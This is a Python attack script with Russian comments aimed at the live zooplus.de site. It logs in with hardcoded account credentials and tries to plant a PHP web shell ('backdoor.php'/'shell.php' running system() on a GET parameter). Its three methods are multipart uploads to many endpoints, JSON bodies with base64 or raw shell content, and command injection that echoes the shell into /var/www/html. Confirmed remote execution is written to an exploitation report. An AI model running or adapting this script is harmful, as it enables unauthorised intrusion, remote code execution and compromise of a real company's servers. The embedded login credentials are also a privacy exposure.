#!/usr/bin/env python3
"""Comprehensive backdoor creation - all possible methods to CREATE backdoor"""
import requests
import json
import re
import urllib.parse
import base64
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "*/*",
})

found_methods = []

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/productphotos", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

php_backdoor = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'

print("[*] Тестирование всех способов СОЗДАТЬ бекдор...\n")

# ============================================================================
# МЕТОД 1: Создать файл через multipart upload на все endpoints
# ============================================================================
print("[*] МЕТОД 1: Multipart upload на все endpoints...")

all_endpoints = [
    "/stats",
    "/api/upload",
    "/api/file/upload",
    "/myaccount/api/upload",
    "/semiprotected/api/upload",
    "/checkout/api/upload",
    "/account/productphotos/upload",
    "/api/productphotos/upload",
    "/semiprotected/api/checkout/state-api/v2/set-article-quantity",
    "/zootopia-events/api/events/sites/1",
    "/leto-personalization/api/v1/personalization/events/sites/1",
]

for ep in all_endpoints:
    try:
        files = {'file': ('backdoor.php', php_backdoor, 'application/x-php')}
        resp = s.post(f"{base}{ep}", files=files, timeout=5, verify=False)
        if resp.status_code in [200, 201, 302]:
            location = resp.headers.get('Location', '')
            if location:
                if not location.startswith('http'):
                    location = f"{base}{location}"
                try:
                    resp2 = s.get(f"{location}?cmd=id", timeout=5, verify=False)
                    if "uid=" in resp2.text:
                        print(f"  [CRITICAL] Бекдор создан: {ep} -> {location}")
                        found_methods.append({
                            "type": "backdoor_created_upload",
                            "severity": "CRITICAL",
                            "endpoint": ep,
                            "backdoor_url": location,
                            "method": "multipart_upload"
                        })
                except: pass
            # Check response for file path
            elif "path" in resp.text.lower() or "url" in resp.text.lower():
                try:
                    data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
                    if isinstance(data, dict):
                        file_path = data.get('path') or data.get('url') or data.get('file')
                        if file_path:
                            if not file_path.startswith('http'):
                                file_path = f"{base}{file_path}"
                            resp2 = s.get(f"{file_path}?cmd=id", timeout=5, verify=False)
                            if "uid=" in resp2.text:
                                print(f"  [CRITICAL] Бекдор создан: {ep} -> {file_path}")
                                found_methods.append({
                                    "type": "backdoor_created_upload",
                                    "severity": "CRITICAL",
                                    "endpoint": ep,
                                    "backdoor_url": file_path,
                                    "method": "multipart_upload"
                                })
                except: pass
    except: pass

# ============================================================================
# МЕТОД 2: Создать файл через JSON с file content
# ============================================================================
print("\n[*] МЕТОД 2: JSON upload с file content...")

for ep in all_endpoints:
    try:
        payloads = [
            {"file": base64.b64encode(php_backdoor.encode()).decode(), "filename": "shell.php"},
            {"content": php_backdoor, "filename": "shell.php", "path": "/var/www/html/shell.php"},
            {"data": php_backdoor, "file": php_backdoor, "filename": "shell.php"},
            {"upload": {"file": base64.b64encode(php_backdoor.encode()).decode(), "filename": "shell.php"}},
        ]
        for payload in payloads:
            resp = s.post(f"{base}{ep}", json=payload, timeout=5, verify=False)
            if resp.status_code in [200, 201]:
                import time
                time.sleep(1)
                try:
                    resp2 = s.get(f"{base}/shell.php?cmd=id", timeout=3, verify=False)
                    if "uid=" in resp2.text:
                        print(f"  [CRITICAL] Бекдор создан через JSON: {ep}")
                        found_methods.append({
                            "type": "backdoor_created_json",
                            "severity": "CRITICAL",
                            "endpoint": ep,
                            "backdoor_url": f"{base}/shell.php",
                            "method": "json_upload"
                        })
                        break
                except: pass
    except: pass

# ============================================================================
# МЕТОД 3: Создать файл через command execution
# ============================================================================
print("\n[*] МЕТОД 3: Command execution для создания файла...")

create_cmds = [
    "echo '<?php if(isset($_GET[\"cmd\"])){system($_GET[\"cmd\"]);} ?>' > /var/www/html/shell.php",
    "printf '<?php if(isset($_GET[\"cmd\"])){system($_GET[\"cmd\"]);} ?>' > /var/www/html/shell.php",
]

for ep in ["/semiprotected/api/checkout/state-api/v2/set-article-quantity"]:
    for cmd in create_cmds:
        try:
            resp = s.post(f"{base}{ep}", json={"articleId": cmd}, timeout=5, verify=False)
            if resp.status_code == 200:
                import time
                time.sleep(2)
                try:
                    resp2 = s.get(f"{base}/shell.php?cmd=id", timeout=3, verify=False)
                    if "uid=" in resp2.text:
                        print(f"  [CRITICAL] Бекдор создан через command: {ep}")
                        found_methods.append({
                            "type": "backdoor_created_command",
                            "severity": "CRITICAL",
                            "endpoint": ep,
                            "command": cmd,
                            "backdoor_url": f"{base}/shell.php",
                            "method": "command_execution"
                        })
                except: pass
        except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_methods:
    print(f"\nНайдено {len(found_methods)} способов создать бекдор:\n")
    for m in found_methods:
        print(f"[{m['severity']}] {m['type']}")
        print(f"    Метод: {m['method']}")
        print(f"    Endpoint: {m['endpoint']}")
        if 'backdoor_url' in m:
            print(f"    URL бекдора: {m['backdoor_url']}")
        print()
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 КРИТИЧНАЯ УЯЗВИМОСТЬ - СПОСОБЫ СОЗДАНИЯ БЕКДОРА\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for m in found_methods:
            f.write(f"### [{m['severity']}] {m['type'].upper().replace('_', ' ')}\n\n")
            f.write(f"**Метод создания:** `{m['method']}`\n\n")
            f.write(f"**Endpoint:** `{m['endpoint']}`\n\n")
            if 'backdoor_url' in m:
                f.write(f"**URL бекдора:** `{m['backdoor_url']}`\n\n")
            if 'command' in m:
                f.write(f"**Команда:** `{m['command']}`\n\n")
            f.write("**Описание:** Найден способ создать бекдор в кластере.\n\n")
            f.write("**Status:** Подтверждено\n\n")
            f.write("**Impact:**\n")
            f.write("- Создание бекдора в кластере\n")
            f.write("- RCE на сервере\n")
            f.write("- Полный контроль над кластером\n")
            f.write("- Компрометация всей инфраструктуры\n\n")
            f.write("---\n\n")
    
    print(f"[+] Report updated: FINAL_EXPLOITATION_REPORT.md")
else:
    print("  Способы создания бекдора не найдены")

print("=" * 70)

